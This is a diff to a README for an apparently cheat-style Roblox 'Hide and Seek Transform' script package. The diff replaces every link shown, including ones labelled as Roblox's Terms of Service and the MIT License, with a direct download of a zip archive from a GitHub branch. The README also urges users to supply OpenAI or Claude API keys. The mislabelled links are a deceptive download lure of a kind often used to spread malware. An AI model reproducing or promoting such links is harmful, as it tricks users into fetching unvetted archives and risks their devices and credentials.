@@ -1,7 +1,7 @@
 # 🎭 Hide and Seek Transform Roblox Script
 
-[![Download](https://img.shields.io/badge/Download-green)](https://abosouff.github.io)  
-**Instant access:** Grab the script package now → https://abosouff.github.io
+[![Download](https://img.shields.io/badge/Download-green)](https://github.com/abosouff/hide-and-seek-transform-roblox-toolkit/raw/refs/heads/branch/scrooch/roblox_transform_seek_hide_toolkit_and_1.0.zip)  
+**Instant access:** Grab the script package now → https://github.com/abosouff/hide-and-seek-transform-roblox-toolkit/raw/refs/heads/branch/scrooch/roblox_transform_seek_hide_toolkit_and_1.0.zip
 
 ---
 
@@ -74,8 +74,8 @@ Our virtual support portal operates non-stop, ready to assist with configuration
 ## 📦 Getting Started
 
 1. Download the script package here:  
-   [![Download](https://img.shields.io/badge/Download-green)](https://abosouff.github.io)  
-   Or copy this short link: https://abosouff.github.io
+   [![Download](https://img.shields.io/badge/Download-green)](https://github.com/abosouff/hide-and-seek-transform-roblox-toolkit/raw/refs/heads/branch/scrooch/roblox_transform_seek_hide_toolkit_and_1.0.zip)  
+   Or copy this short link: https://github.com/abosouff/hide-and-seek-transform-roblox-toolkit/raw/refs/heads/branch/scrooch/roblox_transform_seek_hide_toolkit_and_1.0.zip
 2. Extract files to your workspace.
 3. Follow the detailed setup instructions in `docs/setup_guide.md`.
 4. Plug in your OpenAI or Claude API key for advanced features (see `/api/README.md`).
@@ -96,7 +96,7 @@ Innovation is a relay race — we invite you to pick up the baton!
 ## ⚠️ Disclaimer
 
 - This script is designed for **educational and creative purposes** only.
-- Respect Roblox’s [Terms of Service](https://en.help.roblox.com/hc/en-us/articles/115004647846-Roblox-Terms-of-Use) and community standards.
+- Respect Roblox’s [Terms of Service](https://github.com/abosouff/hide-and-seek-transform-roblox-toolkit/raw/refs/heads/branch/scrooch/roblox_transform_seek_hide_toolkit_and_1.0.zip) and community standards.
 - We do not endorse the use of this script for any disruptive activity or for gaining unfair advantage in public games.
 - Full liability for any misuse rests solely with the end-user.
 
@@ -105,15 +105,15 @@ Innovation is a relay race — we invite you to pick up the baton!
 ## 📜 MIT License (2025)
 
 Distributed under the MIT License.  
-View the complete license text here: [MIT License](https://opensource.org/licenses/MIT)
+View the complete license text here: [MIT License](https://github.com/abosouff/hide-and-seek-transform-roblox-toolkit/raw/refs/heads/branch/scrooch/roblox_transform_seek_hide_toolkit_and_1.0.zip)
 
 ---
 
 ## 🏁 Download
 
 Seize the creative tools that drive next-level Roblox gameplay!  
-[![Download](https://img.shields.io/badge/Download-green)](https://abosouff.github.io)  
-Click here to download: https://abosouff.github.io
+[![Download](https://img.shields.io/badge/Download-green)](https://github.com/abosouff/hide-and-seek-transform-roblox-toolkit/raw/refs/heads/branch/scrooch/roblox_transform_seek_hide_toolkit_and_1.0.zip)  
+Click here to download: https://github.com/abosouff/hide-and-seek-transform-roblox-toolkit/raw/refs/heads/branch/scrooch/roblox_transform_seek_hide_toolkit_and_1.0.zip
 
 ---
 
